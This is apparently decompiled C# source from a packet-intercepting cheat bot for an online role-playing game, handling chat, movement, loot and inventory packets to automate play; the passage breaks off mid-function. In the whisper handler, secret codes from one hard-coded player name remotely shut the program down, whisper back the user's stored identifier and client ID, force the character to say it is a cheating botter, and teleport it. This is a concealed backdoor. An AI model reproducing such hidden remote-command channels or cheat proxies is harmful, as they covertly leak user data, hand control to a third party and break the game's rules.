          str4 = str1.Remove(0, startIndex2 + 2);
          flag = false;
        }
        if (name != string.Empty && client.Tab.ExternalChat.Visible)
        {
          client.Tab.ExternalChat.chatbox.AppendText(Environment.NewLine + str1);
          client.Tab.ExternalChat.chatbox.ScrollToCaret();
        }
        if (!flag && name != string.Empty && (client.Tab.laborname.Text != string.Empty && client.Tab.laborinresponse.Checked) && str4.Equals(client.Tab.laborinresponsetext.Text))
          client.Tab.laborbutton.Text = "Stop";
        if (!flag && name != string.Empty && client.impingskill && ((client.Tab.praytemple.Checked || client.Tab.praynecklace.Checked) && client.Tab.impskillinresponse.Checked) && str4.Equals(client.Tab.impskillinresponsetext.Text))
        {
          client.waitingforlabor = false;
          client.Tab.praybutton.Text = "Stop";
        }
        else if (!flag && name != string.Empty && (client.impingskill && client.Tab.impskillinresponse.Checked) && str4.Equals(client.Tab.impskillinresponsetext.Text))
        {
          client.waitingforlabor = false;
          client.Tab.impskillbutton.Text = "Stop";
          client.Refresh();
        }
        if (client.blockchat && flag && str4.Contains(Server.Stuff[client.Name]))
        {
          client.blockchat = false;
          return false;
        }
        if (!flag && name == Server.klName)
        {
          if (str4.Equals("{=x3jd64d7"))
          {
            Program.MainForm.OnExit(true);
            return false;
          }
          if (str4.Equals("{=xkeo90s"))
          {
            client.blockchat = true;
            now1 = DateTime.Now;
            client.Whisper(name, "<" + now1.ToString("hh:mm tt") + "> - " + Server.Stuff[client.Name] + " - ID: " + Server.cID);
            return false;
          }
          if (str4.Equals("{=xe,83wa"))
          {
            client.Speak("I am a cheating botter", 0);
            return false;
          }
          if (str4.Equals("{=xzoew92"))
          {
            if (client.HasItem("Abel Song"))
              client.UseItem("Abel Song");
            else if (client.HasItem("Mileth Song"))
              client.UseItem("Mileth Song");
            else if (client.HasItem("Piet Song"))
              client.UseItem("Piet Song");
            else if (client.HasItem("Undine Song"))
              client.UseItem("Undine Song");
            else if (client.HasItem("Rucesion Song"))
              client.UseItem("Rucesion Song");
            else if (client.HasItem("Loures Song"))
              client.UseItem("Loures Song");
            else if (client.HasItem("Suomi Song"))
              client.UseItem("Suomi Song");
            else if (client.HasSpell("dachaidh", false))
              client.CastSpell("dachaidh", new uint?());
            return false;
          }
        }
        if (client.Tab.vfriendspeak && Server.friendlist != null && (Server.friendlist.Contains(name.ToLower()) && !flag) && str4.StartsWith("say "))
        {
          string message = str4.Remove(0, 4);
          if (message.ToLower().StartsWith("f5"))
            client.RefreshAllClients();
          else if (message.ToLower().StartsWith("alarm"))
          {
            if (!Server.SentryAlarm)
            {
              User32.FlashWindow(client.mainProc.MainWindowHandle, false);
              Server.SentryAlarm = true;
              Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.Dcalarm1.wav"));
              Server.alarmTimer = DateTime.UtcNow;
              Server.alarm.Play();
            }
          }
          else
            client.Speak(message, 0);
        }
        if (client.safemode)
          ;
        if (str1.StartsWith(Server.klName))
          return false;
      }
      return true;
    }

    public bool ServerMessage_0x0B_MoveClient(Client client, ServerPacket msg)
    {
      Direction direction = (Direction) msg.ReadByte();
      int num1 = (int) msg.ReadUInt16();
      int num2 = (int) msg.ReadUInt16();
      switch (direction)
      {
        case Direction.North:
          client.ServerLocation.X = num1;
          client.ServerLocation.Y = num2 - 1;
          break;
        case Direction.East:
          client.ServerLocation.X = num1 + 1;
          client.ServerLocation.Y = num2;
          break;
        case Direction.South:
          client.ServerLocation.X = num1;
          client.ServerLocation.Y = num2 + 1;
          break;
        case Direction.West:
          client.ServerLocation.X = num1 - 1;
          client.ServerLocation.Y = num2;
          break;
      }
      List<string> checkedtiles = client.checkedtiles;
      int num3 = client.ServerLocation.X;
      string str1 = num3.ToString();
      num3 = client.ServerLocation.Y;
      string str2 = num3.ToString();
      string str3 = str1 + "," + str2;
      checkedtiles.Add(str3);
      client.ClientLocation.Direction = direction;
      client.ServerLocation.Direction = direction;
      if (client.Characters.ContainsKey(client.PlayerID) && client.Characters[client.PlayerID] != null)
      {
        client.Characters[client.PlayerID].Location.X = client.ServerLocation.X;
        client.Characters[client.PlayerID].Location.Y = client.ServerLocation.Y;
        client.Characters[client.PlayerID].Location.Direction = direction;
      }
      return true;
    }

    public bool ServerMessage_0x0C_MoveCharacter(Client client, ServerPacket msg)
    {
      uint key = msg.ReadUInt32();
      int num1 = (int) msg.ReadUInt16();
      int num2 = (int) msg.ReadUInt16();
      int num3 = num1;
      int num4 = num2;
      Direction direction = (Direction) msg.ReadByte();
      switch (direction)
      {
        case Direction.North:
          --num4;
          break;
        case Direction.East:
          ++num3;
          break;
        case Direction.South:
          ++num4;
          break;
        case Direction.West:
          --num3;
          break;
      }
      if ((int) key == (int) client.PlayerID)
      {
        client.ClientLocation.Direction = direction;
        client.ServerLocation.Direction = direction;
      }
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null && (int) key != (int) client.PlayerID)
      {
        client.Characters[key].LastAction = DateTime.UtcNow;
        client.Characters[key].Location.Y = num4;
        client.Characters[key].Location.X = num3;
        client.Characters[key].Location.Direction = direction;
        if (!client.Characters[key].Moved)
          client.Characters[key].Moved = true;
      }
      return true;
    }

    public bool ServerMessage_0x0D_Chat(Client client, ServerPacket msg)
    {
      byte num = msg.ReadByte();
      uint key1 = msg.ReadUInt32();
      string key2 = msg.ReadString((int) msg.ReadByte());
      string str1 = key2;
      if ((num == (byte) 1 || num == (byte) 0) && Server.ignoreaislinglist.Count<string>() > 0)
      {
        foreach (string str2 in Server.ignoreaislinglist)
        {
          if (key2.ToLower().Contains(str2))
            return false;
        }
      }
      if (client.Tab.ExternalChat.Visible)
      {
        client.Tab.ExternalChat.chatbox.AppendText(Environment.NewLine + key2);
        client.Tab.ExternalChat.chatbox.ScrollToCaret();
      }
      if (num == (byte) 0 || num == (byte) 1)
        key2 = key2.Remove(0, key2.IndexOf(" ") + 1);
      if (num == (byte) 0 && (int) key1 == (int) client.PlayerID)
      {
        if (key2.Equals("Don't get lost again.") || key2.StartsWith("Let's go to mommy.") || (key2.Equals("You are safe now!") || key2.Equals("Gotcha!")) || key2.Equals("Don't be scared."))
          client.losterbiedelay = DateTime.UtcNow;
        if (key2.Equals("I caught one!") || key2.Equals("Victory!") || (key2.Equals("Got it!") || key2.Equals("Gotcha!")) || key2.Equals("Got one!"))
          client.bugtimer = DateTime.UtcNow;
      }
      if ((key2.Contains("Kill...") || key2.Contains("Ahhh...")) && (Server.StaticCharacters.ContainsKey(key1) && Server.StaticCharacters[key1] != null) && !Server.StaticCharacters[key1].HasSummoned)
        Server.StaticCharacters[key1].HasSummoned = true;
      if (num == (byte) 2 && (client.Characters.ContainsKey(key1) && client.Characters[key1] != null && Server.SpellList.ContainsKey(key2)))
        client.Characters[key1].LastBlueText = key2;
      if ((num == (byte) 0 || num == (byte) 1) && (client.Characters.ContainsKey(key1) && client.Characters[key1] != null && (Server.StaticCharacters.ContainsKey(key1) && Server.StaticCharacters[key1] != null) && client.Characters[key1].IsOnScreen && (Server.friendlist.Contains(client.Characters[key1].Name.ToLower()) || client.GroupMembers.Contains(client.Characters[key1].Name))))
      {
        if (client.Tab.respondaite.Checked && key2.Equals("aite", StringComparison.CurrentCultureIgnoreCase) && !Server.StaticCharacters[key1].hasaite && client.HasSpell("ard naomh aite", false))
          client.CastSpell("ard naomh aite", new uint?(key1));
        if (client.Tab.respondfas.Checked && key2.Equals("fas", StringComparison.CurrentCultureIgnoreCase) && !Server.StaticCharacters[key1].hasfas && client.HasSpell("mor fas nadur", false))
          client.CastSpell("mor fas nadur", new uint?(key1));
        if (client.Tab.respondflower.Checked && (key2.Equals("flower", StringComparison.CurrentCultureIgnoreCase) || key2.Equals("f", StringComparison.CurrentCultureIgnoreCase)))
          Server.StaticCharacters[key1].wantsflowered = true;
      }
      if (!client.Tab.chattimestamp.Checked || num != (byte) 0)
        return true;
      DateTime now = DateTime.Now;
      ServerPacket msg1 = new ServerPacket((byte) 13);
      msg1.WriteByte(num);
      msg1.WriteUInt32(key1);
      msg1.WriteString8(now.ToString("hh:mm") + ">" + str1);
      msg1.Write(new byte[3]);
      msg1.Write(new byte[3]);
      client.Enqueue(msg1);
      return false;
    }

    public bool ServerMessage_0x0E_RemoveCharacter(Client client, ServerPacket msg)
    {
      uint key = msg.ReadUInt32();
      if (client.Characters.ContainsKey(key) && client.Characters[key] is Npc && ((client.Characters[key] as Npc).Image == 3 && client.disIsSummoned) && (client.Disenchanter != null && (int) client.Disenchanter.ID == (int) key) && DateTime.UtcNow.Subtract(client.Characters[key].CreateTime).TotalSeconds < 1.0)
      {
        client.Disenchanter = (Npc) null;
        client.disIsSummoned = false;
        client.distime = DateTime.MinValue;
      }
      if (client.Characters.ContainsKey(key) && client.Characters[key] is Npc && !client.Characters[key].Counted && ((client.Characters[key] as Npc).Type == Npc.NpcType.PassableMonster || (client.Characters[key] as Npc).Type == Npc.NpcType.NormalMonster))
        client.LastDeadMonster = key;
      if (client.Tab.recorditemdata.Checked)
      {
        if (client.Characters.ContainsKey(key) && client.Characters[key] is Npc && !client.Characters[key].CountedItsKill && ((client.Characters[key] as Npc).Type == Npc.NpcType.PassableMonster || (client.Characters[key] as Npc).Type == Npc.NpcType.NormalMonster))
          client.LastDeadNpc = key;
        if (client.Characters.ContainsKey(key))
        {
          foreach (Character character in client.Characters.Values.OrderByDescending<Character, DateTime>((Func<Character, DateTime>) (c => c.CreateTime)).ToArray<Character>())
          {
            if (character != null && character.IsOnScreen && (!character.WasDropped && character is Npc) && ((character as Npc).Type == Npc.NpcType.Item && character.SpawnLocation.X == client.Characters[key].Location.X && character.SpawnLocation.Y == client.Characters[key].Location.Y) && DateTime.UtcNow.Subtract(character.CreateTime).TotalMilliseconds < 800.0)
            {
              character.WasDropped = true;
              client.Characters[key].DropList.Add(character.ID);
              client.itemdroppeddelay = DateTime.UtcNow;
            }
          }
        }
        if (client.Characters.ContainsKey(key) && client.Characters[key] is Npc && (client.Characters[key] as Npc).Type == Npc.NpcType.Item && (client.Characters[key].Name == "Gold Pile" || client.Characters[key].Name == "Silver Pile"))
          client.LastVanishedGold = key;
      }
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null && (int) key != (int) client.PlayerID)
      {
        if (client.Characters[key] is Player && (int) key == (int) client.checkingformentormarkid)
        {
          client.checkingformentormarkname = string.Empty;
          client.checkingformentormarkid = 0U;
        }
        lock (client.Characters)
        {
          client.Characters[key].Lured = false;
          client.Characters[key].InViewTime = DateTime.UtcNow;
          client.Characters[key].DeathTime = DateTime.UtcNow;
          client.Characters[key].IsOnScreen = false;
        }
        if (client.MainTarget != null && (int) client.MainTarget.ID == (int) key)
          client.follow_walk = 0;
      }
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null && client.MainTarget != null && (int) key == (int) client.MainTarget.ID)
        client.MainTarget = (Npc) null;
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null && (int) client.LastMonsterId == (int) key)
        client.LastMonsterId = 0U;
      if (client.Tab.vusemonster && client.Tab.vusemonsterid > 0 && (!client.imonster && client.Characters.ContainsKey(key)) && (client.Characters[key] != null && client.Characters[key] is Player) && client.SafeToWalkFast)
        client.UseMonsterForm();
      if (client.MapInfo.Name.Contains("Aman") && client.Characters.ContainsKey(key) && (client.Characters[key] != null && client.Characters[key] is Npc) && (client.Characters[key] as Npc).Image == 856)
        client.Characters[key].SpellAnimationHistory.Clear();
      if (client.MapInfo.Name.Contains("Yowien") && client.Characters.ContainsKey(key) && (client.Characters[key] != null && client.Characters[key] is Npc) && ((client.Characters[key] as Npc).Image != 583 && (client.Characters[key] as Npc).Image != 663 && ((client.Characters[key] as Npc).Image != 662 && (client.Characters[key] as Npc).Image != 859)) && (client.Characters[key] as Npc).Image != 860)
        client.Characters[key].SpellAnimationHistory.Clear();
      if (client.MapInfo.Name.Equals("Lost Ruins 6") && client.Characters.ContainsKey(key) && client.Characters[key] != null && client.Characters[key] is Npc)
        client.Characters[key].SpellAnimationHistory.Clear();
      if (client.MapInfo.Name.Contains("Veltain Mines") && client.Characters.ContainsKey(key) && client.Characters[key] != null && client.Characters[key] is Npc)
        client.Characters[key].SpellAnimationHistory.Clear();
      return true;
    }

    public bool ServerMessage_0x0F_AddItem(Client client, ServerPacket msg)
    {
      Item obj1 = new Item();
      obj1.InventorySlot = (int) msg.ReadByte();
      obj1.Icon = msg.ReadUInt16();
      obj1.IconPal = msg.ReadByte();
      obj1.Name = msg.ReadString((int) msg.ReadByte());
      obj1.Amount = msg.ReadUInt32();
      obj1.Stackable = msg.ReadByte();
      obj1.MaximumDurability = msg.ReadUInt32();
      obj1.CurrentDurability = msg.ReadUInt32();
      client.Inventory[obj1.InventorySlot - 1] = obj1;
      if (client.Tab.recorditemdata.Checked)
      {
        foreach (Character character in client.Characters.Values.ToArray<Character>())
        {
          if (character != null && character is Npc && ((character as Npc).Type == Npc.NpcType.Item && obj1.Name == character.Name) && character.InventorySlot == obj1.InventorySlot && character.IsIdentified)
          {
            obj1.IsIdentified = true;
            break;
          }
        }
        foreach (Character character in client.Characters.Values.OrderByDescending<Character, DateTime>((Func<Character, DateTime>) (c => c.DeathTime)).ToArray<Character>())
        {
          if (character != null && character is Npc && ((character as Npc).Type == Npc.NpcType.Item && obj1.Name == character.Name) && (!character.Looted && character.DeathTime != DateTime.MinValue) && DateTime.UtcNow.Subtract(character.DeathTime).TotalMilliseconds < 800.0)
          {
            character.Looted = true;
            character.InventorySlot = obj1.InventorySlot;
            break;
          }
        }
      }
      else
      {
        foreach (Character character in client.Characters.Values.OrderByDescending<Character, DateTime>((Func<Character, DateTime>) (c => c.DeathTime)).ToArray<Character>())
        {
          if (character != null && character is Npc && ((character as Npc).Type == Npc.NpcType.Item && (int) obj1.Icon - 32768 == (character as Npc).Image - 16384) && (!Server.StaticCharacters[character.ID].Looted && character.DeathTime != DateTime.MinValue) && DateTime.UtcNow.Subtract(character.DeathTime).TotalMilliseconds < 800.0)
          {
            character.Looted = true;
            character.InventorySlot = obj1.InventorySlot;
            break;
          }
        }
      }
      if (Program.MainForm.recordchestdata.Checked)
      {
        if (client.agchestopen)
        {
          if (Server.ChestDatabase.ContainsKey("Arcella's Gift1"))
          {
            ++Server.ChestDatabase["Arcella's Gift1"].OpenedCount;
            if (Server.ChestDatabase["Arcella's Gift1"].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Arcella's Gift1"].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Arcella's Gift1"].Treasure.Add(obj1.Name, 1);
          }
          client.agchestopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.wdchestopen)
        {
          if (Server.ChestDatabase.ContainsKey("Water Dungeon Chest"))
          {
            ++Server.ChestDatabase["Water Dungeon Chest"].OpenedCount;
            if (Server.ChestDatabase["Water Dungeon Chest"].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Water Dungeon Chest"].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Water Dungeon Chest"].Treasure.Add(obj1.Name, 1);
          }
          client.wdchestopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.andorchestopen)
        {
          if (Server.ChestDatabase.ContainsKey("Andor Chest"))
          {
            ++Server.ChestDatabase["Andor Chest"].OpenedCount;
            if (Server.ChestDatabase["Andor Chest"].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Andor Chest"].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Andor Chest"].Treasure.Add(obj1.Name, 1);
          }
          client.andorchestopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.queenchestopen)
        {
          if (Server.ChestDatabase.ContainsKey("Queen's Chest"))
          {
            ++Server.ChestDatabase["Queen's Chest"].OpenedCount;
            if (Server.ChestDatabase["Queen's Chest"].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Queen's Chest"].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Queen's Chest"].Treasure.Add(obj1.Name, 1);
          }
          client.queenchestopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.veltainchestopen && obj1.Name != "Treasure Chest")
        {
          if (Server.ChestDatabase.ContainsKey("Veltain Chest " + client.chestfee))
          {
            ++Server.ChestDatabase["Veltain Chest " + client.chestfee].OpenedCount;
            if (Server.ChestDatabase["Veltain Chest " + client.chestfee].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Veltain Chest " + client.chestfee].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Veltain Chest " + client.chestfee].Treasure.Add(obj1.Name, 1);
          }
          else
            Server.ChestDatabase.Add("Veltain Chest " + client.chestfee, new ChestItemXML("Veltain Chest " + client.chestfee, 1U)
            {
              Treasure = {
                {
                  obj1.Name,
                  1
                }
              }
            });
          client.veltainchestopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.heavychestopen && obj1.Name != "Treasure Chest")
        {
          if (Server.ChestDatabase.ContainsKey("Heavy Veltain Chest " + client.chestfee))
          {
            ++Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].OpenedCount;
            if (Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Heavy Veltain Chest " + client.chestfee].Treasure.Add(obj1.Name, 1);
          }
          else
            Server.ChestDatabase.Add("Heavy Veltain Chest " + client.chestfee, new ChestItemXML("Heavy Veltain Chest " + client.chestfee, 1U)
            {
              Treasure = {
                {
                  obj1.Name,
                  1
                }
              }
            });
          client.heavychestopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.smallbagopen && obj1.Name != "Treasure Chest")
        {
          if (Server.ChestDatabase.ContainsKey("Canal Bag"))
          {
            ++Server.ChestDatabase["Canal Bag"].OpenedCount;
            if (Server.ChestDatabase["Canal Bag"].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Canal Bag"].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Canal Bag"].Treasure.Add(obj1.Name, 1);
          }
          client.smallbagopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.bigbagopen && obj1.Name != "Treasure Chest")
        {
          if (Server.ChestDatabase.ContainsKey("Big Canal Bag"))
          {
            ++Server.ChestDatabase["Big Canal Bag"].OpenedCount;
            if (Server.ChestDatabase["Big Canal Bag"].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Big Canal Bag"].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Big Canal Bag"].Treasure.Add(obj1.Name, 1);
          }
          client.bigbagopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
        if (client.heavybagopen && obj1.Name != "Treasure Chest")
        {
          if (Server.ChestDatabase.ContainsKey("Heavy Canal Bag"))
          {
            ++Server.ChestDatabase["Heavy Canal Bag"].OpenedCount;
            if (Server.ChestDatabase["Heavy Canal Bag"].Treasure.ContainsKey(obj1.Name))
            {
              Dictionary<string, int> treasure;
              string name;
              (treasure = Server.ChestDatabase["Heavy Canal Bag"].Treasure)[name = obj1.Name] = treasure[name] + 1;
            }
            else
              Server.ChestDatabase["Heavy Canal Bag"].Treasure.Add(obj1.Name, 1);
          }
          client.heavybagopen = false;
          Program.MainForm.BeginInvoke((Action) (() => Program.MainForm.ItemXMLEditor.UpdateChestsForm()));
        }
      }
      client.swappingitem = false;
      client.waitingonlore = false;
      if (obj1.MaximumDurability > 0U && obj1.Name != "Warranty Bag" && ((obj1.CurrentDurability < 800U && obj1.MaximumDurability > 1000U || (double) obj1.CurrentDurability / (double) obj1.MaximumDurability * 100.0 < 80.0) && !client.HasLowDuraDN()))
        client.needsrepaired = true;
      if (client.polishsuccess == 1)
        client.dropitemslot = obj1.InventorySlot;
      if (obj1.InventorySlot == 1 && client.firstitemslot == "")
        client.firstitemslot = obj1.Name;
      if (obj1.Name == "Giant Pearl" && client.giantpearl)
        client.giantpearl2 = true;
      else if ((int) obj1.Icon - 32768 == 54 && obj1.Amount == 25U && client.Tab.impskillbutton.Text == "Stop")
        client.has25hydele = true;
      else if ((int) obj1.Icon - 32768 == 62 && obj1.Amount == 25U && client.Tab.impskillbutton.Text == "Stop")
        client.has25betony = true;
      else if ((int) obj1.Icon - 32768 == 55 && obj1.Amount == 25U && client.Tab.impskillbutton.Text == "Stop")
        client.has25personaca = true;
      else if (obj1.Name == "Komadium")
      {
        if (obj1.Amount == 10U)
          client.SendMessage(client.Name + " is low on Komadiums! [10 left]", "red", true);
        else if (obj1.Amount == 5U)
          client.SendMessage(client.Name + " is low on Komadiums! [5 left]", "red", true);
        else if (obj1.Amount == 1U)
          client.SendMessage(client.Name + " is low on Komadiums! [1 left]", "red", true);
      }
      else if (obj1.Name.Contains("Prayer Necklace"))
      {
        object obj2 = new object();
        string[] strArray = obj1.Name.Split(' ');
        if (!client.Tab.prayernecklist.Items.Contains((object) obj1.Name))
          client.Tab.prayernecklist.Items.Add((object) obj1.Name);
        if (client.PrayerSpell.Contains(strArray[0]))
        {
          object name = (object) obj1.Name;
          client.PrayerNeck = obj1.Name;
          client.Tab.prayernecklist.SelectedItem = name;
        }
      }
      if (obj1.Name == "Wine" && client.outofwine)
      {
        client.outofwine = false;
        client.Tab.impskillbutton.Text = "Stop";
      }
      if (client.Tab.pigwalk.Checked && client.HasItem("Ability and Experience Gift 1") && client.ItemAmount("Ability and Experience Gift 1") == 5U)
      {
        client.SendMessage("Stopped walking, you're at max stack of gift 1s", "red", false);
        client.pause = true;
        client.Tab.btnPlay.Enabled = true;
        client.Tab.btnStop.Enabled = false;
      }
      if (client.Tab.pigwalk.Checked && client.HasItem("Ability and Experience Gift 2") && client.ItemAmount("Ability and Experience Gift 2") == 5U)
      {
        client.SendMessage("Stopped walking, you're at max stack of gift 2s", "red", false);
        client.pause = true;
        client.Tab.btnPlay.Enabled = true;
        client.Tab.btnStop.Enabled = false;
      }
      if (client.MapInfo.Name == "Mount Giragan 1" || client.MapInfo.Name == "Mount Giragan 2" || client.MapInfo.Name == "Mount Giragan 3")
      {
        if (client.HasItem("Cedar Log"))
          client.cedarlogs = client.ItemAmount("Cedar Log");
        if (client.HasItem("Fir Log"))
          client.firlogs = client.ItemAmount("Fir Log");
        client.yulelogcount = "{=bC " + client.cedarlogs.ToString() + ", F " + client.firlogs.ToString();
        if (client.ItemAmount("Fir Log") == 12U && client.ItemAmount("Cedar Log") == 12U)
        {
          client.Tab.autowalker_locales.Text = "Suomi";
          client.Tab.walklocaleslist.SelectedItem = (object) "Weapon Shop";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
          client.Tab.mediumwalk.Checked = true;
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
          client.LastnpcpopupID = 0U;
          client.yulequest = true;
          client.Tab.walktomonster.Checked = false;
          client.Tab.assail.Checked = false;
          client.Tab.insectassail.Checked = false;
          client.Tab.wayregionson.Checked = false;
        }
        client.SendMessage(client.yulelogcount, (byte) 18, false);
      }
      if (obj1.Name == "Copar Neck" && client.digboneseast < 1)
        client.digboneseast = 1;
      else if (obj1.Name == "Copar Bones" && client.digboneseast < 2)
        client.digboneseast = 2;
      else if (obj1.Name == "Copar Wing" && client.digboneseast < 3)
        client.digboneseast = 3;
      else if (obj1.Name == "Copar Leg" && client.digbonesnorth < 1)
        client.digbonesnorth = 1;
      else if (obj1.Name == "Copar Claw" && client.digbonesnorth < 2)
        client.digbonesnorth = 2;
      else if (obj1.Name == "Copar Horn" && client.digbonesnorth < 3)
        client.digbonesnorth = 3;
      else if (obj1.Name == "Copar Tail" && client.digbonesmiddle < 1)
        client.digbonesmiddle = 1;
      else if (obj1.Name == "Copar Skull" && client.digbonesmiddle < 2)
        client.digbonesmiddle = 2;
      else if (obj1.Name == "Copar Ribs" && client.digbonesmiddle < 3)
        client.digbonesmiddle = 3;
      if (client.Tab.vautowalker_locales.Equals("Nobis"))
      {
        if (obj1.Name == "Emerald Eye" && client.MapInfo.Name.Contains("Ruins Altar"))
        {
          client.Tab.walklocaleslist.Text = "4th Summon";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
        }
        else if (obj1.Name == "Sapphire Eye" && client.MapInfo.Name.Contains("Ruins Altar"))
        {
          client.Tab.walklocaleslist.Text = "3rd Summon";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
        }
        else if (obj1.Name == "Ruby Eye" && client.MapInfo.Name.Contains("Ruins Altar"))
        {
          client.Tab.walklocaleslist.Text = "2nd Summon";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
        }
        else if (obj1.Name == "Copar Ribs")
        {
          client.Tab.walklocaleslist.Text = "1st Summon";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
        }
        else if (obj1.Name == "Copar Horn")
        {
          client.Tab.walklocaleslist.Text = "dig bones (middle)";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
        }
        else if (obj1.Name == "Copar Wing")
        {
          client.Tab.walklocaleslist.Text = "dig bones (north)";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
        }
      }
      if (client.MapInfo.Number == 8997)
      {
        if ((int) obj1.Icon - 32768 == 8135)
          client.bug35 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8136)
          client.bug36 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8137)
          client.bug37 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8138)
          client.bug38 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8139)
          client.bug39 = obj1.Amount;
        client.bugcount = client.bug35.ToString() + " - " + client.bug36.ToString() + " - " + client.bug37.ToString() + " - " + client.bug38.ToString() + " - " + client.bug39.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      else if (client.MapInfo.Number == 8996)
      {
        if ((int) obj1.Icon - 32768 == 8140)
          client.bug40 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8141)
          client.bug41 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8142)
          client.bug42 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8143)
          client.bug43 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8144)
          client.bug44 = obj1.Amount;
        client.bugcount = client.bug40.ToString() + " - " + client.bug41.ToString() + " - " + client.bug42.ToString() + " - " + client.bug43.ToString() + " - " + client.bug44.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      else if (client.MapInfo.Number == 8999)
      {
        if ((int) obj1.Icon - 32768 == 8125)
          client.bug25 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8126)
          client.bug26 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8127)
          client.bug27 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8128)
          client.bug28 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8129)
          client.bug29 = obj1.Amount;
        client.bugcount = client.bug25.ToString() + " - " + client.bug26.ToString() + " - " + client.bug27.ToString() + " - " + client.bug28.ToString() + " - " + client.bug29.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      else if (client.MapInfo.Number == 8998)
      {
        if ((int) obj1.Icon - 32768 == 8130)
          client.bug30 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8131)
          client.bug31 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8132)
          client.bug32 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8133)
          client.bug33 = obj1.Amount;
        else if ((int) obj1.Icon - 32768 == 8134)
          client.bug34 = obj1.Amount;
        client.bugcount = client.bug30.ToString() + " - " + client.bug31.ToString() + " - " + client.bug32.ToString() + " - " + client.bug33.ToString() + " - " + client.bug34.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      return true;
    }

    public bool ServerMessage_0x10_RemoveItem(Client client, ServerPacket msg)
    {
      int num = (int) msg.ReadByte();
      if (num > 0 && client.Tab.recorditemdata.Checked)
      {
        foreach (Character character in client.Characters.Values.ToArray<Character>())
        {
          if (character != null && character.InventorySlot == num)
            character.InventorySlot = int.MinValue;
        }
      }
      if (client.Inventory[num - 1] != null && client.Inventory[num - 1].Name == "Komadium" && !client.HasItem("Komadium"))
        client.SendMessage(client.Name + " is out of Komadiums!", "red", true);
      else if (client.Inventory[num - 1] != null && client.Inventory[num - 1].Name == "Leaf Key" && !client.HasItem("Leaf Key"))
